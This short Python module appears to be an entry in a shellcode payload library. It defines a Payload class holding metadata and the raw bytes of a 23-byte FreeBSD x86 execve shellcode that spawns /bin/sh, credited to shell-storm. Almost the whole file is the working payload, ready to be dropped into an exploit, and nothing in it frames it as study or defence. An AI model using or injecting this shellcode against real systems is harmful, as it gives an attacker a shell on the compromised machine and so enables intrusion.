from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "IZ"
    Shellcode.info["name"] = "FreeBSDx86 - execve shellcode"
    Shellcode.info["references"] = [
        "http://shell-storm.org/shellcode/files/shellcode-170.php"
    ]
    Shellcode.info["size"] = 23
    Shellcode.info["payload"] = [
        r"\x31\xc0\x50\x68\x2f\x2f\x73\x68"  
        r"\x68\x2f\x62\x69\x6e\x89\xe3"
        r"\x50\x54\x53\x50\xb0\x3b\xcd\x80"
    ]
